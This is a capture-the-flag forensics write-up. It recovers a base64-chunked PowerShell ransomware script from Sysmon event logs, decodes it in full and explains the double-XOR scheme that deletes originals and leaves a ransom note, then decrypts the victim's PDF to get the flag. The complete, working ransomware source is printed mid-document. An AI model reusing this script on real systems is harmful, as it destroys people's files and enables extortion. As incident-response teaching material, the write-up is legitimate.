# Challenge description

Rumors of a black drake terrorizing the fields of Dunlorn have spread far and wide. The village has offered a hefty bounty for its defeat. Sir Alaric and Thorin answered the call also returning with treasures from its lair. Among the retrieved items they found a map. Unfortunately it cannot be used directly because a custom encryption algorithm was probably used. Luckily it was possible to retrieve the original code that managed the encryption process. Can you investigate about what happened and retrieve the map content?

# Soluce

We start by downloading the challenge files, we see that there is a PDF file that has been encoded ([map.pdf.secured](media/map.pdf.secured)), and a zip file with .evtx, which are Windows event logs (Event Viewer).

We will therefore start by transforming these files so that we can analyze them.

```sh
python -m venv env
source env/bin/activate
pip install python-evtx

mkdir logs_txt
for f in *.evtx; do
    out="logs_txt/$(basename "$f").log"
    echo "[*] Dumping $f"
    evtx_dump.py "$f" > "$out"
done
```

Now we can search informations with grep:

```sh
┌──(env)(virgile㉿localhost)-[~/Téléchargements/forensics_cave_expedition/Logs]
└─$ grep -Ei 'encod' logs_txt/*.log
[...]
logs_txt/Microsoft-Windows-Sysmon_Operational.evtx.log:<Data Name="CommandLine">powershell  -c "'JGszNFZtID0gIktpNTBlSFFnS2k1a2IyTWdLaTVrYjJONElDb3VjR1JtIg0KJG03OFZvID0gIkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFFwWlQxVlNJRVpKVEVWVElFaEJWa1VnUWtWRlRpQkZUa05TV1ZCVVJVUWdRbGtnUVNCU1FVNVRUMDFYUVZKRkNpb2dWMmhoZENCb1lYQndaVzVsWkQ4S1RXOXpkQ0J2WmlCNWIzVnlJR1pwYkdWeklHRnlaU0J1YnlCc2IyNW5aWElnWVdOalpYTnphV0pzWlNCaVpXTmhkWE5sSUhSb1pYa2dhR0YyWlNCaVpXVnVJR1Z1WTNKNWNIUmxaQzRnUkc4Z2JtOTBJ' | Out-File -Encoding ascii -FilePath b -NoNewline"</Data>
logs_txt/Microsoft-Windows-Sysmon_Operational.evtx.log:<Data Name="CommandLine">powershell  -c "'SGRoYzNSbElIbHZkWElnZEdsdFpTQjBjbmxwYm1jZ2RHOGdabWx1WkNCaElIZGhlU0IwYnlCa1pXTnllWEIwSUhSb1pXMDdJR2wwSUdseklHbHRjRzl6YzJsaWJHVWdkMmwwYUc5MWRDQnZkWElnYUdWc2NDNEtLaUJJYjNjZ2RHOGdjbVZqYjNabGNpQnRlU0JtYVd4bGN6OEtVbVZqYjNabGNtbHVaeUI1YjNWeUlHWnBiR1Z6SUdseklERXdNQ1VnWjNWaGNtRnVkR1ZsWkNCcFppQjViM1VnWm05c2JHOTNJRzkxY2lCcGJuTjBjblZqZEdsdmJuTXVDaW9nU1hNZ2RHaGxjbVVnWVNCa1pXRmtiR2x1WlQ4S1QyWWdZMjkxY25ObExDQjBhR1Z5WlNCcGN5NGdXVzkxSUdoaGRtVWdkR1Z1SUdSaGVYTWdiR1ZtZEM0Z1JHOGdibTkwSUcxcGMzTWdkR2hwY3lCa1pXRmtiR2x1WlM0S0xTMHRM' | Out-File -Encoding ascii -FilePath b -Append -NoNewline"</Data>
logs_txt/Microsoft-Windows-Sysmon_Operational.evtx.log:<Data Name="CommandLine">powershell  -c "'UzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFFvPSINCiRhNTNWYSA9ICJOWGh6UjA5aWFraFJhVkJCUjJSNlRHZENSV1ZKT0hVd1dWTktjVGMyUldsNWRXWTRkMEZTVXpkeFluUlFORzUwVVZrMU1IbElPR1I2UzFwbFEwRnpXZz09Ig0KJGI2NFZiID0gIm4ybW1YYVd5NXBMNGtwTldyN2JjZ0VLeE1lVXg1ME1KIg0KDQokZTkwVmcgPSBAe30NCiRmMTJWaCA9IEB7fQ0KDQpGb3IgKCR4ID0gNjU7ICR4IC1sZSA5MDsgJHgrKykgew0KICAgICRlOTBWZ1soW2NoYXJdJHgpXSA9IGlmKCR4IC1lcSA5MCkgeyBb' | Out-File -Encoding ascii -FilePath b -Append -NoNewline"</Data>
logs_txt/Microsoft-Windows-Sysmon_Operational.evtx.log:<Data Name="CommandLine">powershell  -c "'Y2hhcl02NSB9IGVsc2UgeyBbY2hhcl0oJHggKyAxKSB9DQp9DQoNCmZ1bmN0aW9uIG45MFZwIHsNCiAgICAgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkbTc4Vm8pKQ0KfQ0KDQpmdW5jdGlvbiBsNTZWbiB7DQogICAgcmV0dXJuIChhMTJWYyAkazM0Vm0pLlNwbGl0KCIgIikNCn0NCg0KRm9yICgkeCA9IDk3OyAkeCAtbGUgMTIyOyAkeCsrKSB7DQogICAgJGU5MFZnWyhbY2hhcl0keCldID0gaWYoJHggLWVxIDEyMikgeyBbY2hhcl05NyB9IGVsc2UgeyBbY2hhcl0oJHggKyAxKSB9DQp9DQoNCmZ1bmN0aW9uIGExMlZjIHsNCiAgICBwYXJhbShbc3RyaW5nXSRhMzRWZCkNCiAgICByZXR1' | Out-File -Encoding ascii -FilePath b -Append -NoNewline"</Data>
logs_txt/Microsoft-Windows-Sysmon_Operational.evtx.log:<Data Name="CommandLine">powershell  -c "'cm4gW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGEzNFZkKSkNCn0NCg0KJGM1NlZlID0gYTEyVmMgJGE1M1ZhDQokZDc4VmYgPSBhMTJWYyAkYjY0VmINCg0KRm9yICgkeCA9IDQ4OyAkeCAtbGUgNTc7ICR4KyspIHsNCiAgICAkZTkwVmdbKFtjaGFyXSR4KV0gPSBpZigkeCAtZXEgNTcpIHsgW2NoYXJdNDggfSBlbHNlIHsgW2NoYXJdKCR4ICsgMSkgfQ0KfQ0KDQokZTkwVmcuR2V0RW51bWVyYXRvcigpIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICRmMTJWaFskXy5WYWx1ZV0gPSAkXy5LZXkNCn0NCg0KZnVuY3Rpb24gbDM0Vm4gew0KICAgIHBhcmFtKFtieXRlW11dJG01NlZvLCBbYnl0ZVtdXSRuNzhWcCwgW2J5' | Out-File -Encoding ascii -FilePath b -Append -NoNewline"</Data>
logs_txt/Microsoft-Windows-Sysmon_Operational.evtx.log:<Data Name="CommandLine">powershell  -c "'dGVbXV0kbzkwVnEpDQogICAgJHAxMlZyID0gW2J5dGVbXV06Om5ldygkbTU2Vm8uTGVuZ3RoKQ0KICAgIGZvciAoJHggPSAwOyAkeCAtbHQgJG01NlZvLkxlbmd0aDsgJHgrKykgew0KICAgICAgICAkcTM0VnMgPSAkbjc4VnBbJHggJSAkbjc4VnAuTGVuZ3RoXQ0KICAgICAgICAkcjU2VnQgPSAkbzkwVnFbJHggJSAkbzkwVnEuTGVuZ3RoXQ0KICAgICAgICAkcDEyVnJbJHhdID0gJG01NlZvWyR4XSAtYnhvciAkcTM0VnMgLWJ4b3IgJHI1NlZ0DQogICAgfQ0KICAgIHJldHVybiAkcDEyVnINCn0NCg0KZnVuY3Rpb24gczc4VnUgew0KICAgIHBhcmFtKFtieXRlW11dJHQ5MFZ2LCBbc3RyaW5nXSR1MTJWdywgW3N0cmluZ10kdjM0VngpDQoNCiAgICBpZiAoJHQ5MFZ2IC1lcSAk' | Out-File -Encoding ascii -FilePath b -Append -NoNewline"</Data>
logs_txt/Microsoft-Windows-Sysmon_Operational.evtx.log:<Data Name="CommandLine">powershell  -c "'bnVsbCAtb3IgJHQ5MFZ2Lkxlbmd0aCAtZXEgMCkgew0KICAgICAgICByZXR1cm4gJG51bGwNCiAgICB9DQoNCiAgICAkeTkwVmEgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR1MTJWdykNCiAgICAkejEyVmIgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR2MzRWeCkNCiAgICAkYTM0VmMgPSBsMzRWbiAkdDkwVnYgJHk5MFZhICR6MTJWYg0KDQogICAgcmV0dXJuIFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJGEzNFZjKQ0KfQ0KDQpmdW5jdGlvbiBvMTJWcSB7DQogICAgcGFyYW0oW3N3aXRjaF0kcDM0VnIpDQoNCiAgICB0cnkgew0KICAgICAgICBpZiAoJHAzNFZyKSB7DQogICAgICAgICAgICBmb3JlYWNoICgkcTU2' | Out-File -Encoding ascii -FilePath b -Append -NoNewline"</Data>
logs_txt/Microsoft-Windows-Sysmon_Operational.evtx.log:<Data Name="CommandLine">powershell  -c "'VnMgaW4gbDU2Vm4pIHsNCiAgICAgICAgICAgICAgICAkZDM0VnAgPSAiZGNhMDFhcTIvIg0KICAgICAgICAgICAgICAgIGlmIChUZXN0LVBhdGggJGQzNFZwKSB7DQogICAgICAgICAgICAgICAgICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJGQzNFZwIC1SZWN1cnNlIC1FcnJvckFjdGlvbiBTdG9wIHwNCiAgICAgICAgICAgICAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkV4dGVuc2lvbiAtbWF0Y2ggIl5cLiRxNTZWcyQiIH0gfA0KICAgICAgICAgICAgICAgICAgICAgICAgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyNzhWdCA9ICRfLkZ1bGxOYW1lDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAk' | Out-File -Encoding ascii -FilePath b -Append -NoNewline"</Data>
logs_txt/Microsoft-Windows-Sysmon_Operational.evtx.log:<Data Name="CommandLine">powershell  -c "'cjc4VnQpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHM5MFZ1ID0gW0lPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJHI3OFZ0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdDEyVnYgPSBzNzhWdSAkczkwVnUgJGM1NlZlICRkNzhWZg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbSU8uRmlsZV06OldyaXRlQWxsVGV4dCgiJHI3OFZ0LnNlY3VyZWQiLCAkdDEyVnYpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtICRyNzhWdCAtRm9yY2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAg' | Out-File -Encoding ascii -FilePath b -Append -NoNewline"</Data>
logs_txt/Microsoft-Windows-Sysmon_Operational.evtx.log:<Data Name="CommandLine">powershell  -c "'fQ0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIHt9DQp9DQoNCmlmICgkZW52OlVTRVJOQU1FIC1lcSAiZGV2ZWxvcGVyNTY1NDY3NTYiIC1hbmQgJGVudjpDT01QVVRFUk5BTUUgLWVxICJXb3Jrc3RhdGlvbjU2NzgiKSB7DQogICAgbzEyVnEgLXAzNFZyDQogICAgbjkwVnANCn0NCg0K' | Out-File -Encoding ascii -FilePath b -Append -NoNewline"</Data>
[...]
```

If we put all the strings together, and decode them in base64 on: https://gchq.github.io/CyberChef/

We find the following code:

```powershell
$k34Vm = "Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"
$m78Vo = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgQlkgQSBSQU5TT01XQVJFCiogV2hhdCBoYXBwZW5lZD8KTW9zdCBvZiB5b3VyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJsZSBiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gRG8gbm90IHdhc3RlIHlvdXIgdGltZSB0cnlpbmcgdG8gZmluZCBhIHdheSB0byBkZWNyeXB0IHRoZW07IGl0IGlzIGltcG9zc2libGUgd2l0aG91dCBvdXIgaGVscC4KKiBIb3cgdG8gcmVjb3ZlciBteSBmaWxlcz8KUmVjb3ZlcmluZyB5b3VyIGZpbGVzIGlzIDEwMCUgZ3VhcmFudGVlZCBpZiB5b3UgZm9sbG93IG91ciBpbnN0cnVjdGlvbnMuCiogSXMgdGhlcmUgYSBkZWFkbGluZT8KT2YgY291cnNlLCB0aGVyZSBpcy4gWW91IGhhdmUgdGVuIGRheXMgbGVmdC4gRG8gbm90IG1pc3MgdGhpcyBkZWFkbGluZS4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo="
$a53Va = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
$b64Vb = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"

$e90Vg = @{}
$f12Vh = @{}

For ($x = 65; $x -le 90; $x++) {
    $e90Vg[([char]$x)] = if($x -eq 90) { [char]65 } else { [char]($x + 1) }
}

function n90Vp {
     [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m78Vo))
}

function l56Vn {
    return (a12Vc $k34Vm).Split(" ")
}

For ($x = 97; $x -le 122; $x++) {
    $e90Vg[([char]$x)] = if($x -eq 122) { [char]97 } else { [char]($x + 1) }
}

function a12Vc {
    param([string]$a34Vd)
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a34Vd))
}

$c56Ve = a12Vc $a53Va
$d78Vf = a12Vc $b64Vb

For ($x = 48; $x -le 57; $x++) {
    $e90Vg[([char]$x)] = if($x -eq 57) { [char]48 } else { [char]($x + 1) }
}

$e90Vg.GetEnumerator() | ForEach-Object {
    $f12Vh[$_.Value] = $_.Key
}

function l34Vn {
    param([byte[]]$m56Vo, [byte[]]$n78Vp, [byte[]]$o90Vq)
    $p12Vr = [byte[]]::new($m56Vo.Length)
    for ($x = 0; $x -lt $m56Vo.Length; $x++) {
        $q34Vs = $n78Vp[$x % $n78Vp.Length]
        $r56Vt = $o90Vq[$x % $o90Vq.Length]
        $p12Vr[$x] = $m56Vo[$x] -bxor $q34Vs -bxor $r56Vt
    }
    return $p12Vr
}

function s78Vu {
    param([byte[]]$t90Vv, [string]$u12Vw, [string]$v34Vx)

    if ($t90Vv -eq $null -or $t90Vv.Length -eq 0) {
        return $null
    }

    $y90Va = [System.Text.Encoding]::UTF8.GetBytes($u12Vw)
    $z12Vb = [System.Text.Encoding]::UTF8.GetBytes($v34Vx)
    $a34Vc = l34Vn $t90Vv $y90Va $z12Vb

    return [Convert]::ToBase64String($a34Vc)
}

function o12Vq {
    param([switch]$p34Vr)

    try {
        if ($p34Vr) {
            foreach ($q56Vs in l56Vn) {
                $d34Vp = "dca01aq2/"
                if (Test-Path $d34Vp) {
                    Get-ChildItem -Path $d34Vp -Recurse -ErrorAction Stop |
                        Where-Object { $_.Extension -match "^\.$q56Vs$" } |
                        ForEach-Object {
                            $r78Vt = $_.FullName
                            if (Test-Path $r78Vt) {
                                $s90Vu = [IO.File]::ReadAllBytes($r78Vt)
                                $t12Vv = s78Vu $s90Vu $c56Ve $d78Vf
                                [IO.File]::WriteAllText("$r78Vt.secured", $t12Vv)
                                Remove-Item $r78Vt -Force
                            }
                        }
                }
            }
        }
    }
    catch {}
}

if ($env:USERNAME -eq "developer56546756" -and $env:COMPUTERNAME -eq "Workstation5678") {
    o12Vq -p34Vr
    n90Vp
}
```

1. Variable Decoding

    - The script begins by loading and decoding base64 files: the ransom note, the list of extensions to target, and the encryption keys.

2. Searching for Target Files

    - It searches (in dca01aq2/) for all files with certain extensions (.txt, .doc, .docx, .pdf, etc.).

3. Double XOR Encryption

    - Each file is read in bytes, XORed with both keys, then re-encoded in base64 and saved with the .secured extension.

4. Deleting Original Files

    - The original files are deleted after encryption.

5. Ransom Note

    - The script displays a message informing the user that their files are encrypted and that recovery requires following the attackers' instructions.

6. Possible Decryption

    - Since it is an XOR, it can be easily reversed using the same process.

In conclusion, this ransomware is quite basic: a double XOR (therefore symmetrical), and the use of base64 to store the result. The most "devious" thing is that the keys themselves are decoded twice (base64 → text → UTF-8 re-encoding → bytes) and that the ".pdf" file is not necessarily a PDF.

So we will use the following script to decode our .pdf file: [decrypt.py](code/decrypt.py)

```sh
┌──(env)(virgile㉿localhost)-[~/Téléchargements/forensics_cave_expedition]
└─$ python decrypt.py                                                                                                                                                                                                                   
Unciphering done. Check the file type:
  file map_decrypted.pdf

┌──(env)(virgile㉿localhost)-[~/Téléchargements/forensics_cave_expedition]
└─$ file map_decrypted.pdf                                                                                                                                                                                                                  
map_decrypted.pdf: PDF document, version 1.7
```

So we can open the pdf file: [map_decrypted.pdf](media/map_decrypted.pdf)

So the flag is `HTB{Dunl0rn_dRAk3_LA1r_15_n0W_5AF3}`.